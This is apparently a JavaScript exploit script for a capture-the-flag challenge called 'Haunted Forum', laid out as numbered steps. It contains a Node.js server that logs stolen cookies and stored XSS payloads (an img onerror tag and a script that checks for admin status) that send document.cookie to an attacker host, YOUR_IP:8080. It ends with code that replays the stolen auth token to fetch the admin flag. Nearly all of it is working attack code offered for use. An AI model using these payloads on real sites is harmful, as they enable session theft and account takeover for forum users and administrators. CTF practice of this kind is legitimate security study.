/*
XSS Exploit for Haunted Forum Challenge

This is a sample exploit script that demonstrates how to perform the 
XSS attack to steal the admin's cookie and get the flag.

How to use:
1. Start a simple HTTP server to receive the stolen cookie
2. Register an account on the Haunted Forum
3. Create a post with the XSS payload below
4. Report the post to get the admin to view it
5. Capture the admin cookie and use it to access the admin panel
6. Get the flag from the admin panel
*/

// 1. Start a simple HTTP server to receive the stolen cookie
// Run this in a terminal with Node.js installed:
/*
const http = require('http');
const url = require('url');

http.createServer((req, res) => {
    const queryObject = url.parse(req.url, true).query;
    console.log('Cookie captured:', queryObject.cookie);
    
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end('Cookie received');
}).listen(8080);

console.log('Cookie capture server running on port 8080');
*/

// 2. XSS payload to include in your forum post:
/*
<img src="x" onerror="fetch('http://YOUR_IP:8080?cookie=' + document.cookie)">
*/

// 3. More advanced XSS payload that first checks if the user is admin:
/*
<script>
fetch('/api/profile')
    .then(response => response.json())
    .then(data => {
        if (data.user.isAdmin) {
            fetch('http://YOUR_IP:8080?cookie=' + document.cookie);
        }
    });
</script>
*/

// 4. Using the stolen cookie to access the admin panel:
/*
// Copy the cookie value from your console
const stolenCookie = 'auth_token=STOLEN_TOKEN_VALUE';

// Create a fetch request with the stolen cookie
fetch('http://localhost:3000/api/admin/flag', {
    headers: {
        'Cookie': stolenCookie
    }
})
.then(response => response.json())
.then(data => {
    console.log('Flag:', data.flag);
})
.catch(error => {
    console.error('Error:', error);
});
*/

// Note: Replace YOUR_IP with your actual IP address or hosting domain
// Note: This exploit works because the post content is not sanitized before being rendered 